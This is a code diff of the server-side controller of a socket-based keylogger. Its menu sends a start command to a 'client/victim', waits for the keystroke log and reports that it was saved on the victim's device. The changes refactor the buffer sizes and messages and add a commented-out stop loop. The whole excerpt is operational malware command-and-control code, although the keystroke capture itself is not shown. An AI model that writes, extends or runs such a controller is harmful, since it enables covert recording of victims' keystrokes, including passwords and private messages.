@@ -69,8 +69,8 @@ if __name__ == '__main__':
 
                                 # Get status
                                 print(constants.AWAIT_START_RESPONSE_MSG)
-                                status = client_socket.recv(constants.BYTE_LIMIT).decode()
-                                msg = client_socket.recv(constants.BYTE_LIMIT).decode()
+                                status = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+                                msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
 
                                 if status == constants.STATUS_TRUE:
                                     print(constants.CLIENT_RESPONSE.format(msg))
@@ -80,20 +80,32 @@ if __name__ == '__main__':
                                     client_socket.send(constants.START_KEYLOG_MSG.encode())
 
                                     # Awaiting Response
-                                    msg = client_socket.recv(constants.BYTE_LIMIT).decode()
+                                    msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
                                     print(constants.CLIENT_RESPONSE.format(msg))
 
-                                    # Await Result
-                                    result = client_socket.recv(constants.BYTE_LIMIT).decode()
+                                    # Check for signal to stop and send to client/victim
+                                    # signal_to_stop = constants.ZERO
+                                    # print("[+] Enter the number 2 to stop the keylogger: ")
+                                    #
+                                    # while True:
+                                    #     try:
+                                    #         signal_to_stop = int(input())
+                                    #         if signal_to_stop == 2:
+                                    #             client_socket.send(constants.STOP_KEYWORD.encode())
+                                    #             break
+                                    #         print("[+] INVALID INPUT: Please try again: ")
+                                    #     except ValueError as e:
+                                    #         print("[+] INVALID INPUT: Please try again: ")
+
+                                    # Await Results from keylogger on client/victim side (BLOCKING CALL)
+                                    result = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+                                    result_msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
 
                                     if result == constants.STATUS_TRUE:
-                                        print("[+] OPERATION SUCCESSFUL: Keylog file saved on client/victim device!")
+                                        print(constants.CLIENT_RESPONSE.format(result_msg))
+                                        print(constants.KEYLOG_OPERATION_SUCCESSFUL)
                                     else:
-                                        print(f"[+] ERROR: An error has occurred during execution of "
-                                              f"keylogger: ")
-
-                                    # Get user to hit menu item "2" to stop keylogger (WHILE LOOP?)
-                                    signal_to_stop = False
+                                        print(constants.KEYLOG_ERROR_MSG.format(result_msg))
 
                                 else:
                                     print(constants.CLIENT_RESPONSE.format(msg))
